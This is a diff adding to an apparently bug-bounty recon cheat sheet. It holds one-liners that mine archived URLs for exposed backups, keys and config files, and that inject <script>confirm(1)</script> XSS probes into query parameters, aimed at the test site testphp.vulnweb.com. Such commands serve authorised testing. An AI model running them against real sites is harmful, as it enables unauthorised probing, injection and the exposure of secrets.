@@ -20,3 +20,17 @@ curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.example
 
 cat out.txt | uro |  grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc'
 ```
+
+### xss oneliner
+
+```
+echo "testphp.vulnweb.com" | waybackurls | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew -p | pvreplace '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' -vuln
+```
+
+- ```echo "testphp.vulnweb.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln```
+  __Tools used__
+- __[waybackurls](https://github.com/tomnomnom/waybackurls.git)__
+- __[urldedupe](https://github.com/ameenmaali/urldedupe.git)__
+- __[unew](https://github.com/rix4uni/unew)__
+- __[pvreplace](https://github.com/rix4uni/pvreplace)__
+- __[xsschecker](https://github.com/rix4uni/xsschecker)__
